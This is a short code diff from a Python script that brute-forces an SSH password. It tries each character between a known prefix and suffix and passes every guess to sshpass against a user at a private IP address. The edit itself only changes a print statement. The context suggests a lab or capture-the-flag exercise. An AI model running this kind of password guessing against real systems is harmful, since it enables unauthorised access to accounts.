@@ -100,7 +100,7 @@ ascii_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#
 
 for char in ascii_chars:
     password_attempt = "kaeCaiS" + char + "ojie7i"
-    print("Trying password : " + known_password + char + "ojie7i")
+    print("Trying password : " + "kaeCaiS" + char + "ojie7i")
     try:
         command = f"sshpass -p '{password_attempt}' tocean@10.35.122.20"
         
